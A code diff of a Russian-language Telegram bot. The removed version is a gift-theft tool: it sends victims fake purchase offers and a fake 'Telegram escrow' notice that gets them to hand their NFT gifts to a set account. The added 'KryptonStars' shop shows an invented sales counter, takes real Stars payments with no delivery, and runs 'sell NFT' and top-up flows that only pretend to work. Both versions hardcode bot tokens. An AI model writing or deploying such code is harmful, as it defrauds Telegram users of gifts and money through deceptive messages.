@@ -1,425 +1,215 @@
-import os
-import re
-import json
-import time
-import threading
-import requests
-import telebot
-from flask import Flask
-from telebot.types import (
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-    InlineQueryResultArticle,
-    InputTextMessageContent,
-    ReplyKeyboardMarkup,
-    KeyboardButton,
+import asyncio
+import logging
+
+from aiogram import Bot, Dispatcher, F
+from aiogram.filters import Command
+from aiogram.types import (
+    Message, CallbackQuery, LabeledPrice, 
+    PreCheckoutQuery, SuccessfulPayment
 )
+from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.client.default import DefaultBotProperties
 
-# ─────────────────────── НАСТРОЙКИ ───────────────────────
+# ================= НАСТРОЙКИ =================
+BOT_TOKEN = "8800276454:AAF0QTpC9CcvbchTY_bE01BAm1uKvIyPyCQ" # Замени на свой токен
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8204031823:AAHA7mUlrZGVcMlF8whWAqYakjvdTdJ02Bo")
-OWNER_ID = 861423393
-VERIFY_TIMEOUT_SECONDS = 300
-DB_FILE = "users_db.json"
+logging.basicConfig(level=logging.INFO)
 
-# ─────────────────────── ПРЕМИУМ-ЭМОДЗИ ───────────────────────
+# В aiogram 3.7+ parse_mode задается так:
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
+dp = Dispatcher()
 
-EMOJI_GIFT = '<tg-emoji emoji-id="5456140674028019486">🎁</tg-emoji>'
-EMOJI_STAR = '<tg-emoji emoji-id="5874948844935974490">⭐️</tg-emoji>'
-EMOJI_LOCK = '<tg-emoji emoji-id="5807868868886009920">🔒</tg-emoji>'
+# ================= СОСТОЯНИЯ (FSM) =================
+class UserFlow(StatesGroup):
+    sell_nft_input = State()
+    topup_input = State()
 
-# ─────────────────────── БАЗА ДАННЫХ ───────────────────────
+# ================= КЛАВИАТУРЫ =================
+def get_main_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🕶 Товары Telegram", callback_data="catalog")
+    builder.button(text="🤝 Продать NFT", callback_data="sell_nft")
+    builder.button(text="🕹 Игры", callback_data="games")
+    builder.button(text="🧢 Пополнить баланс", callback_data="topup")
+    builder.button(text="👺 Профиль", callback_data="profile")
+    builder.button(text="👨‍💻 Поддержка", callback_data="support")
+    builder.button(text="👤 Топ клиентов", callback_data="top_clients")
+    builder.button(text="🧑‍💻 Создать своего бота", callback_data="create_bot")
+    builder.button(text="🧐 Отзывы", callback_data="reviews")
+    # Сетка: 1, 1, 1, 2, 2, 1, 1
+    builder.adjust(1, 1, 1, 2, 2, 1, 1)
+    return builder.as_markup()
 
-def load_db():
-    if os.path.exists(DB_FILE):
-        try:
-            with open(DB_FILE, "r", encoding="utf-8") as f:
-                return json.load(f)
-        except Exception:
-            return {}
-    return {}
+def get_catalog_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="⭐ Купить 50 Stars (50 ⭐)", callback_data="buy_50_stars")
+    builder.button(text="⭐ Купить 100 Stars (100 ⭐)", callback_data="buy_100_stars")
+    builder.button(text="💎 Telegram Premium", callback_data="buy_premium")
+    builder.button(text="⬅️ Назад в меню", callback_data="back_to_menu")
+    builder.adjust(1, 1, 1, 1)
+    return builder.as_markup()
 
-def save_db(data):
-    try:
-        with open(DB_FILE, "w", encoding="utf-8") as f:
-            json.dump(data, f, ensure_ascii=False, indent=4)
-    except Exception as e:
-        print(f"[DB ERROR] {e}")
+def get_back_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="⬅️ Назад в меню", callback_data="back_to_menu")
+    return builder.as_markup()
 
-users_db = load_db()
+# ================= СТАРТ И ГЛАВНОЕ МЕНЮ =================
+@dp.message(Command("start"))
+async def cmd_start(message: Message):
+    text = (
+        "👋 <b>Добро пожаловать в KryptonStars!</b>\n\n"
+        "У нас вы можете купить:\n"
+        "⭐ Telegram Stars\n"
+        "💎 Telegram Premium\n"
+        "И много чего другого дешевле чем в приложении и без верификации!\n\n"
+        "🔥 <b>Куплено звезд: 1,143,994</b>"
+    )
+    await message.answer(text, reply_markup=get_main_menu())
 
-def get_user_settings(user_id):
-    uid = str(user_id)
-    if uid not in users_db:
-        users_db[uid] = {
-            "target_url": "tg://send_gift?to=heiseysex",
-            "target_nickname": "@HeiseySex",
-            "escrow_template": (
-                f"{EMOJI_LOCK} Пользователь зарезервировал <b>{{amount}}</b> {EMOJI_STAR} через "
-                "эксроу-систему Telegram. Средства хранятся на специальном "
-                "эксроу-счёте и будут автоматически зачислены на ваш баланс "
-                "звёзд сразу после передачи подарка.\n\n"
-                "━━━━━━━━━━━━━━━━━━━━\n"
-                "<b>Инструкция для завершения сделки:</b>\n\n"
-                "1. Передайте подарок пользователю: <a href=\"{gift_url}\"><b>{nickname}</b></a>\n"
-                "2. Нажмите «Передать NFT» и выберите <a href=\"{url}\">{name}</a>\n"
-                "3. Подтвердите передачу подарка.\n"
-                "━━━━━━━━━━━━━━━━━━━━\n\n"
-                "Telegram зафиксирует транзакцию и моментально зачислит "
-                "<b>{amount}</b> {star} на ваш баланс."
-            ).replace("{star}", EMOJI_STAR)
-        }
-        save_db(users_db)
-    return users_db[uid]
+@dp.callback_query(F.data == "back_to_menu")
+async def back_to_menu(call: CallbackQuery, state: FSMContext):
+    await state.clear()
+    text = (
+        "👋 <b>Главное меню</b>\n\n"
+        "🔥 <b>Куплено звезд: 1,143,994</b>"
+    )
+    # Редактируем текущее сообщение, чтобы не засорять чат
+    await call.message.edit_text(text, reply_markup=get_main_menu())
+    await call.answer()
 
-# ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────
+# ================= РАЗДЕЛ "ТОВАРЫ TELEGRAM" (ЗВЕЗДЫ) =================
+@dp.callback_query(F.data == "catalog")
+async def open_catalog(call: CallbackQuery):
+    await call.message.edit_text(
+        "🕶 <b>Товары Telegram</b>\n\nВыбери, что хочешь приобрести:",
+        reply_markup=get_catalog_menu()
+    )
+    await call.answer()
 
-bot = telebot.TeleBot(BOT_TOKEN)
-offers = {}
-offers_lock = threading.Lock()
-user_states = {}
-
-# ─────────────────────── УТИЛИТЫ ───────────────────────
-
-def normalize_url(raw):
-    raw = raw.strip().strip('"').strip("'")
-    if not raw: return ""
-    if raw.startswith("@"): return f"https://t.me/{raw[1:]}"
-    if raw.startswith(("http://", "https://", "tg://")): return raw
-    if raw.startswith(("t.me/", "telegram.me/")): return f"https://{raw}"
-    return f"https://t.me/{raw.lstrip('/')}"
-
-def extract_name_from_url(url):
-    """Достает название подарка из ссылки вида t.me/nft/PetSnake-149950"""
-    match = re.search(r'/nft/([a-zA-Z]+)-(\d+)', url)
-    if match:
-        raw_name = match.group(1)
-        numbers = match.group(2)
-        name_with_spaces = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
-        return f"{name_with_spaces} #{numbers}"
+# --- ОПЛАТА ЗВЕЗДАМИ (XTR) ---
+@dp.callback_query(F.data.in_({"buy_50_stars", "buy_100_stars"}))
+async def send_stars_invoice(call: CallbackQuery):
+    # Определяем цену и количество
+    amount = 50 if call.data == "buy_50_stars" else 100
     
-    match_only_name = re.search(r'/nft/([a-zA-Z]+)', url)
-    if match_only_name:
-        raw_name = match_only_name.group(1)
-        return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
+    # ВАЖНО: currency="XTR" - это код Telegram Stars.
+    # provider_token="" - для цифровых товаров оставляем пустым.
+    prices = [LabeledPrice(label=f"{amount} Stars", amount=amount)]
+    
+    await call.message.answer_invoice(
+        title=f"Покупка {amount} Stars",
+        description=f"Покупка {amount} звезд для вашего аккаунта Telegram.",
+        payload=f"stars_order_{amount}_{call.from_user.id}",
+        currency="XTR", 
+        prices=prices,
+        provider_token="" 
+    )
+    await call.answer()
+
+# Обязательный обработчик: Telegram спрашивает "Все ок?"
+@dp.pre_checkout_query()
+async def pre_checkout_handler(query: PreCheckoutQuery):
+    # Здесь можно проверить наличие товара, лимиты и т.д.
+    # Если всё ок - разрешаем оплату
+    await query.answer(ok=True)
+
+# Обработчик успешной оплаты
+@dp.message(F.successful_payment)
+async def success_payment(message: Message):
+    payment: SuccessfulPayment = message.successful_payment
+    
+    # ID платежа нужен для возврата средств, если что-то пойдет не так
+    charge_id = payment.telegram_payment_charge_id
+    
+    await message.answer(
+        f"✅ <b>Оплата успешно получена!</b>\n\n"
+        f"Вы приобрели {payment.total_amount} ⭐\n"
+        f"ID транзакции: <code>{charge_id}</code>\n\n"
+        f"<i>(В реальном боте здесь должна быть логика зачисления звезд на аккаунт через Fragment API)</i>",
+        reply_markup=get_back_menu()
+    )
+
+
+# ================= ЗАГЛУШКИ ДЛЯ ОСТАЛЬНЫХ КНОПОК =================
+@dp.callback_query(F.data.in_({
+    "games", "profile", "support", 
+    "top_clients", "create_bot", "reviews", "buy_premium"
+}))
+async def stub_menu(call: CallbackQuery):
+    texts = {
+        "games": "🕹 <b>Игры</b>\n\nРаздел находится в разработке.",
+        "profile": f"👺 <b>Профиль</b>\n\nID: <code>{call.from_user.id}</code>\nБаланс: 0 ⭐\nЗаказов: 0",
+        "support": "👨‍💻 <b>Поддержка</b>\n\nНапишите нашему менеджеру: @support_username",
+        "top_clients": "👤 <b>Топ клиентов</b>\n\n1. Скрыт\n2. Скрыт\n3. Скрыт",
+        "create_bot": "🧑‍💻 <b>Создать своего бота</b>\n\nФункция появится позже.",
+        "reviews": "🧐 <b>Отзывы</b>\n\nОтзывы появятся после первых реальных покупок.",
+        "buy_premium": "💎 <b>Telegram Premium</b>\n\nОплата Premium временно недоступна."
+    }
+    await call.message.edit_text(
+        texts.get(call.data, "В разработке..."), 
+        reply_markup=get_back_menu()
+    )
+    await call.answer()
+
+
+# ================= СЦЕНАРИЙ "ПРОДАТЬ NFT" (ДЛЯ ВИДА) =================
+@dp.callback_query(F.data == "sell_nft")
+async def start_sell_nft(call: CallbackQuery, state: FSMContext):
+    await call.message.edit_text(
+        "🤝 <b>Продажа NFT</b>\n\n"
+        "Отправь ссылку на свой NFT (например, подарок или username):",
+        reply_markup=get_back_menu()
+    )
+    await state.set_state(UserFlow.sell_nft_input)
+    await call.answer()
+
+@dp.message(UserFlow.sell_nft_input)
+async def process_sell_nft(message: Message, state: FSMContext):
+    # Имитация успешной обработки
+    await state.clear()
+    await message.answer(
+        f"✅ <b>Заявка принята!</b>\n\n"
+        f"Ваш NFT <code>{message.text[:50]}</code> отправлен на оценку.\n"
+        f"Результат придет в течение 24 часов.",
+        reply_markup=get_back_menu()
+    )
+
+
+# ================= СЦЕНАРИЙ "ПОПОЛНИТЬ БАЛАНС" (ДЛЯ ВИДА) =================
+@dp.callback_query(F.data == "topup")
+async def start_topup(call: CallbackQuery, state: FSMContext):
+    await call.message.edit_text(
+        "🧢 <b>Пополнение баланса</b>\n\n"
+        "Введите сумму в рублях, на которую хотите пополнить баланс (только число):",
+        reply_markup=get_back_menu()
+    )
+    await state.set_state(UserFlow.topup_input)
+    await call.answer()
+
+@dp.message(UserFlow.topup_input)
+async def process_topup(message: Message, state: FSMContext):
+    if not message.text.isdigit():
+        await message.answer("Пожалуйста, введите число.")
+        return
         
-    return "Подарок"
-
-def parse_offer_command(text):
-    """Убирает префикс команды (с точкой или слешем) и разбирает аргументы."""
-    # Регулярка ищет начало строки, слэш или точку, возможный пробел, и слово
-    body = re.sub(r'^(/|\.)\s*(gift|offer|heisey|nft|сделка)\s*', '', text, flags=re.IGNORECASE).strip()
-    if not body: return None
-
-    quoted = re.findall(r'"([^"]*)"', body)
-    without_quotes = re.sub(r'"[^"]*"', "", body).strip()
-
-    if len(quoted) >= 2:
-        name = quoted[0]
-        url = normalize_url(quoted[1])
-        amount_part = without_quotes.split()[0] if without_quotes else ""
-    elif len(quoted) == 1:
-        name = quoted[0]
-        rest = without_quotes.split()
-        url = normalize_url(rest[0]) if rest else None
-        amount_part = rest[1] if len(rest) >= 2 else ""
-    else:
-        parts = body.split()
-        if len(parts) == 1:
-            return None
-        elif len(parts) == 2:
-            url = normalize_url(parts[0])
-            amount_part = parts[1]
-            name = extract_name_from_url(url)
-        else:
-            name = " ".join(parts[:-2])
-            url = normalize_url(parts[-2])
-            amount_part = parts[-1]
-
-    amount = re.sub(r"\D", "", amount_part) if amount_part else ""
-    if not url or not amount: return None
-    return name, url, amount
-
-def parse_inline_query(raw):
-    parts = [p.strip() for p in re.split(r"[|,]", raw or "") if p.strip()]
-    if len(parts) == 1:
-        text = raw.strip()
-        url_match = re.search(r'(https?://\S+|t\.me/\S+|@\w+)', text)
-        if url_match:
-            url_raw = url_match.group(1)
-            name = text[:url_match.start()].strip()
-            amount_raw = text[url_match.end():].strip()
-            if not name:
-                name = extract_name_from_url(normalize_url(url_raw))
-        else:
-            words = text.split()
-            if len(words) >= 3:
-                name = " ".join(words[:-2])
-                url_raw = words[-2]
-                amount_raw = words[-1]
-            else:
-                name, url_raw, amount_raw = text, "", ""
-    else:
-        name = parts[0]
-        url_raw = parts[1] if len(parts) > 1 else ""
-        amount_raw = parts[2] if len(parts) > 2 else ""
-    amount = re.sub(r"\D", "", amount_raw)
-    url = normalize_url(url_raw) if url_raw else ""
-    if not name and url:
-        name = extract_name_from_url(url)
-    return name, url, amount
-
-# ─────────────────────── ТЕКСТЫ ───────────────────────
-
-def build_offer_message(name, url, amount):
-    return (
-        f"{EMOJI_GIFT} Вам поступило предложение о покупке подарка.\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Пользователь предлагает вам <b>{amount}</b> {EMOJI_STAR} за подарок "
-        f"<a href=\"{url}\">{name}</a>.\n\n"
-        "━━━━━━━━━━━━━━━━━━━━"
+    await state.clear()
+    await message.answer(
+        f"✅ <b>Заявка на пополнение на {message.text} ₽ создана!</b>\n\n"
+        f"<i>(Здесь должна быть интеграция с платежной системой CryptoBot или СБП для получения ссылки на оплату)</i>",
+        reply_markup=get_back_menu()
     )
 
-def build_offer_keyboard():
-    keyboard = InlineKeyboardMarkup()
-    keyboard.row(
-        InlineKeyboardButton("Принять", callback_data="stage_accept"),
-        InlineKeyboardButton("Отклонить", callback_data="stage_decline"),
-    )
-    return keyboard
 
-def build_escrow_message(user_id, name, url, amount):
-    settings = get_user_settings(user_id)
-    template = settings.get("escrow_template")
-    return template.format(
-        gift_url=settings.get("target_url"),
-        nickname=settings.get("target_nickname"),
-        name=name,
-        url=url,
-        amount=amount
-    )
-
-def build_escrow_keyboard(user_id):
-    settings = get_user_settings(user_id)
-    keyboard = InlineKeyboardMarkup()
-    keyboard.row(InlineKeyboardButton("Передать подарок", url=settings.get("target_url")))
-    keyboard.row(
-        InlineKeyboardButton("Подтвердить", callback_data="stage_verify"),
-        InlineKeyboardButton("Отменить", callback_data="stage_decline"),
-    )
-    return keyboard
-
-# ─────────────────────── ОТПРАВКА ───────────────────────
-
-def try_delete_message(chat_id, message_id, conn_id=None):
-    try:
-        if conn_id:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
-            requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "business_connection_id": conn_id}, timeout=10)
-        else:
-            bot.delete_message(chat_id, message_id)
-    except Exception:
-        pass
-
-def safe_edit(chat_id, message_id, text, parse_mode="HTML", reply_markup=None, conn_id=None):
-    kwargs = {"chat_id": chat_id, "message_id": message_id, "parse_mode": parse_mode}
-    if reply_markup is not None: kwargs["reply_markup"] = reply_markup
-    if conn_id: kwargs["business_connection_id"] = conn_id
-    try:
-        bot.edit_message_text(text, **kwargs)
-        return True
-    except Exception as e:
-        print(f"[EDIT] {message_id}: {e}")
-        return False
-
-def send_business_message(chat_id, text, conn_id, reply_markup=None):
-    kwargs = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "business_connection_id": conn_id}
-    if reply_markup is not None: kwargs["reply_markup"] = reply_markup
-    try:
-        return bot.send_message(**kwargs)
-    except Exception as e:
-        print(f"[SEND] ОШИБКА: {e}")
-        return None
-
-# ─────────────────────── МЕНЮ НАСТРОЕК ───────────────────────
-
-@bot.message_handler(commands=['start', 'settings'])
-def cmd_start(message):
-    kb = ReplyKeyboardMarkup(resize_keyboard=True)
-    kb.row(KeyboardButton("👤 Изменить ник"), KeyboardButton("🔗 Изменить ссылку"))
-    kb.row(KeyboardButton("📝 Изменить текст"))
-    bot.send_message(message.chat.id, "<b>Настройки профиля</b>\n\nЗдесь вы можете изменить данные для офферов.", parse_mode="HTML", reply_markup=kb)
-
-@bot.message_handler(func=lambda m: m.text == "👤 Изменить ник")
-def set_nick_start(message):
-    user_states[message.from_user.id] = "waiting_nick"
-    bot.send_message(message.chat.id, "Введите новый юзернейм (например, @MyBestFriend):")
-
-@bot.message_handler(func=lambda m: m.text == "🔗 Изменить ссылку")
-def set_url_start(message):
-    user_states[message.from_user.id] = "waiting_url"
-    bot.send_message(message.chat.id, "Введите новую ссылку для кнопки (например, tg://send_gift?to=myfriend):")
-
-@bot.message_handler(func=lambda m: m.text == "📝 Изменить текст")
-def set_text_start(message):
-    user_states[message.from_user.id] = "waiting_text"
-    bot.send_message(message.chat.id, "Отправьте новый текст инструкции.\nДоступные переменные: <code>{gift_url}</code>, <code>{nickname}</code>, <code>{name}</code>, <code>{url}</code>, <code>{amount}</code>", parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.from_user.id in user_states, content_types=['text'])
-def handle_settings_input(message):
-    state = user_states.get(message.from_user.id)
-    uid = str(message.from_user.id)
-    settings = get_user_settings(message.from_user.id)
-    
-    if state == "waiting_nick": settings["target_nickname"] = message.text.strip()
-    elif state == "waiting_url": settings["target_url"] = message.text.strip()
-    elif state == "waiting_text": settings["escrow_template"] = message.text
-    
-    users_db[uid] = settings
-    save_db(users_db)
-    del user_states[message.from_user.id]
-    bot.send_message(message.chat.id, "✅ Настройки сохранены!", reply_markup=telebot.types.ReplyKeyboardRemove())
-
-# ─────────────────────── BUSINESS-ОБРАБОТЧИК ───────────────────────
-
-@bot.business_message_handler(func=lambda m: m.text is not None, content_types=["text"])
-def handle_business_message(message):
-    conn_id = message.business_connection_id
-    sender_id = message.from_user.id
-    if sender_id != OWNER_ID: return
-    
-    text_lower = message.text.strip().lower()
-    
-    # Все доступные команды (с точкой и со слэшем, с пробелом и без)
-    valid_prefixes = [
-        "/gift", "/ gift",
-        "/offer", "/ offer", ".offer", ". offer",
-        "/heisey", "/ heisey", ".heisey", ". heisey",
-        "/nft", "/ nft", ".nft", ". nft",
-        "/gift", "/ gift", ".gift", ". gift",
-        "/сделка", "/ сделка", ".сделка", ". сделка"
-    ]
-    
-    if not any(text_lower.startswith(p) for p in valid_prefixes):
-        return
-
-    parsed = parse_offer_command(message.text)
-    if not parsed:
-        send_business_message(
-            message.chat.id, 
-            "❌ Неверный формат команды.\n\n"
-            "Используй: /gift \"Название\" \"ссылка\" 100\n"
-            "Или: /offer ссылка 100\n"
-            "Или: /heisey ссылка 100", 
-            conn_id
-        )
-        return
-
-    name, url, amount = parsed
-    try_delete_message(message.chat.id, message.message_id, conn_id)
-    sent = send_business_message(message.chat.id, build_offer_message(name, url, amount), conn_id, reply_markup=build_offer_keyboard())
-
-    if sent is None: return
-
-    with offers_lock:
-        offers[sent.message_id] = {
-            "name": name, "url": url, "amount": amount,
-            "finished": False, "conn_id": conn_id,
-            "chat_id": message.chat.id, "user_id": sender_id
-        }
-
-# ─────────────────────── INLINE-РЕЖИМ ───────────────────────
-
-@bot.inline_handler(func=lambda q: True)
-def handle_inline_query(query):
-    raw = (query.query or "").strip()
-    if query.from_user.id != OWNER_ID:
-        bot.answer_inline_query(query.id, [InlineQueryResultArticle(id="d", title="Нет доступа", description="", input_message_content=InputTextMessageContent(message_text="Нет доступа"))], cache_time=0)
-        return
-
-    name, url, amount = parse_inline_query(raw)
-    results = []
-
-    if name and url and amount:
-        results.append(
-            InlineQueryResultArticle(
-                id="offer_ready",
-                title=f"🎁 {name} — {amount} ⭐",
-                description=f"Отправить оффер",
-                input_message_content=InputTextMessageContent(message_text=build_offer_message(name, url, amount), parse_mode="HTML"),
-                reply_markup=build_offer_keyboard(),
-            )
-        )
-    else:
-        results.append(InlineQueryResultArticle(id="h", title="Формат", description="", input_message_content=InputTextMessageContent(message_text="Формат: @бот Название | ссылка | 100")))
-
-    bot.answer_inline_query(query.id, results, cache_time=0)
-
-# ─────────────────────── КНОПКИ ───────────────────────
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_router(call):
-    payload = call.data
-    conn_id = getattr(call.message, "business_connection_id", None)
-    is_inline = (conn_id is None)
-    offer_data = offers.get(call.message.message_id, {})
-    target_user_id = offer_data.get("user_id", call.from_user.id)
-
-    if payload == "stage_accept":
-        text = call.message.html_text or call.message.text or ""
-        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
-        url = m.group(1) if m else "https://t.me"
-        name = m.group(2) if m else "Подарок"
-        m2 = re.search(r'<b>(\d+)</b>\s*', text)
-        amount = m2.group(1) if m2 else "0"
-
-        if is_inline:
-            bot.answer_callback_query(call.id, text="Инструкция ниже 👇")
-            try:
-                bot.send_message(
-                    chat_id=call.message.chat.id,
-                    text=build_escrow_message(target_user_id, name, url, amount),
-                    parse_mode="HTML",
-                    reply_markup=build_escrow_keyboard(target_user_id),
-                )
-            except Exception as e:
-                print(f"Ошибка: {e}")
-        else:
-            bot.answer_callback_query(call.id, text="Инструкция ниже.", show_alert=True)
-            safe_edit(
-                call.message.chat.id, call.message.message_id,
-                build_escrow_message(target_user_id, name, url, amount),
-                reply_markup=build_escrow_keyboard(target_user_id),
-                conn_id=conn_id,
-            )
-
-    elif payload == "stage_verify":
-        bot.answer_callback_query(call.id, text="Проверка запущена.")
-        safe_edit(call.message.chat.id, call.message.message_id, "⏳ <b>Проверка...</b>", conn_id=conn_id)
-
-    elif payload == "stage_decline":
-        bot.answer_callback_query(call.id, text="Отклонено.")
-        if is_inline:
-            bot.send_message(call.message.chat.id, "❌ <b>Предложение отклонено.</b>", parse_mode="HTML")
-        else:
-            safe_edit(call.message.chat.id, call.message.message_id, "❌ <b>Предложение отклонено.</b>", conn_id=conn_id)
-
-# ─────────────────────── ЗАПУСК ───────────────────────
-
-app = Flask(__name__)
-
-@app.route("/")
-def index(): return "Bot is running"
-
-def run_bot():
-    print("✨ Бот запущен. База данных: users_db.json")
-    bot.infinity_polling(
-        allowed_updates=["message", "callback_query", "inline_query", "business_connection", "business_message", "edited_business_message", "deleted_business_messages"],
-        timeout=30,
-    )
+# ================= ЗАПУСК БОТА =================
+async def main():
+    print("Бот запущен...")
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("Бот остановлен.")
